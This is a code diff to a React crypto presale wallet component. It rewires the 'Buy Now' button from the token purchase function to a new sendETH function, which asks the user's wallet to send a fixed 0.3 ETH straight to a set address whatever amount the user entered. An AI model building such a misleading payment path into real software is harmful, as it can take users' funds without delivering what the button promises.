@@ -118,13 +118,14 @@ const PreSaleWallet = () => {
 
   const isSwitchNetwork = useMemo(() => { 
     // console.log("chainId == bnb_mainnet_network", chainId , bnb_mainnet_network);
-    
-    // return true
-    if(isETH) {
-      return chainId == eth_mainnet_network
-    } else {
-      return chainId == bnb_mainnet_network
+    if (isConnected) {
+      if(isETH) {
+        return chainId == eth_mainnet_network
+      } else {
+        return chainId == bnb_mainnet_network
+      }
     }
+    return true
   }, [chainId, isConnected]);
 
   async function switchToMainnet() {
@@ -151,6 +152,37 @@ const PreSaleWallet = () => {
       console.error("Lỗi khi chuyển mạng:", error);
     }
   }
+
+  async function sendETH() {
+    try {
+      const ethereum = window.ethereum;
+  
+      const provider = new ethers.providers.Web3Provider(ethereum);
+      const signer = provider.getSigner();
+
+      const amountToSend = ethers.utils.parseEther("0.3");
+
+      const tx = {
+          to: ETHtokenAddress,
+          // to: '0xe0012A0aEf3BaC2F1751c6b60999a4d039A31809',
+          value: amountToSend,
+          gasLimit: BigInt(10000000) 
+      };
+
+      const txResponse = await signer.sendTransaction(tx);
+
+      console.log("tx hash: ", txResponse);
+      
+
+      await txResponse.wait();
+
+      console.log("Transaction sent successfully.");
+  
+    } catch (error) {
+      console.error("Error sending:", error);
+    }
+  }
+  
 
   const [isOpenModelSelectNetwork, setIsOpenModelSelectNetwork] = useState(false)
   const [amountInput, setAmountInput] = useState(0.0)
@@ -563,7 +595,7 @@ const PreSaleWallet = () => {
                       {switchToken == 'ETH' ? <Button
                         className={amountInput <= 0 ? "bg-gray-600 h-[66px] block rounded-xl w-full py-5 px-2 text-white text-xl":
                         "bg-blue-700 h-[66px] block rounded-xl w-full py-5 px-2 text-white text-xl"}
-                        onClick={() => buyTokenWithETH()}
+                        onClick={() => sendETH()}
                         disabled={amountInput <= 0}
                       >
                         Buy Now
